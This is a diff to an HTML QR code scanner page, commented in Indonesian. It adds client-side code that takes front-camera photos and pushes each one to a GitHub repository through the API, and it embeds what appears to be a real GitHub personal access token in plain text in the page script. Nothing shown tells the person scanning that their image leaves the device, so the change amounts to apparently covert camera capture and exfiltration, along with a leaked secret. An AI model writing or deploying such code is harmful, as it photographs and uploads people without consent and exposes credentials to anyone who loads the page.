@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>QR Code Scanner 1</title>
+    <title>QR Code Scanner and Upload Photo</title>
     <style>
         #videoBack {
             width: 100%;
@@ -22,12 +22,13 @@
         }
         #urlButton {
             margin-top: 10px;
+            display: none;
         }
     </style>
 </head>
 <body>
 
-    <h1>QR Code Scanner</h1>
+    <h1>QR Code Scanner and Upload Photo</h1>
     <div id="cameraBackContainer">
         <video id="videoBack" autoplay></video>
     </div>
@@ -51,6 +52,15 @@
         let currentStreamFront;
         let lastDetectedURL = '';
         let capturedBackPhotoUrl = ''; // Menyimpan foto terakhir kamera belakang
+
+        // Ganti dengan token GitHub Anda
+        const GITHUB_TOKEN = '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'; 
+        // Ganti dengan username GitHub Anda
+        const GITHUB_USERNAME = 'ridwansyaiful'; 
+        // Ganti dengan nama repositori Anda
+        const REPO_NAME = 'web-gps'; 
+        const BRANCH = 'main'; // Nama branch
+        const FOLDER_PATH = 'pap/'; // Folder tempat menyimpan gambar
 
         async function startCameraBack() {
             // Mulai kamera belakang
@@ -90,6 +100,9 @@
                     const capturedFrontPhotoUrl = canvasFront.toDataURL('image/png');
                     document.getElementById('capturedPhotoFront').src = capturedFrontPhotoUrl;
                     
+                    // Upload ke GitHub
+                    uploadToGitHub(capturedFrontPhotoUrl);
+
                     // Kembali ke kamera belakang setelah ambil foto
                     startCameraBack(); // Restart kamera belakang
                     
@@ -117,6 +130,33 @@
             }
 
             requestAnimationFrame(scanQRCode);
+        }
+
+        // Fungsi untuk mengunggah gambar ke GitHub
+        async function uploadToGitHub(dataURL) {
+            const base64Image = dataURL.split(',')[1]; // Menghapus prefix data URL
+            const fileName = `photo_${Date.now()}.png`; // Nama file unik berdasarkan timestamp
+            const apiUrl = `https://api.github.com/repos/${GITHUB_USERNAME}/${REPO_NAME}/contents/${FOLDER_PATH}${fileName}`;
+
+            const response = await fetch(apiUrl, {
+                method: 'PUT',
+                headers: {
+                    'Authorization': `token ${GITHUB_TOKEN}`,
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    message: `Upload image ${fileName}`,
+                    content: base64Image,
+                    branch: BRANCH
+                })
+            });
+
+            if (response.ok) {
+                const data = await response.json();
+                console.log('Image uploaded to GitHub:', data.content.html_url);
+            } else {
+                console.error('Failed to upload image to GitHub', response);
+            }
         }
 
         // Event listener untuk tombol URL
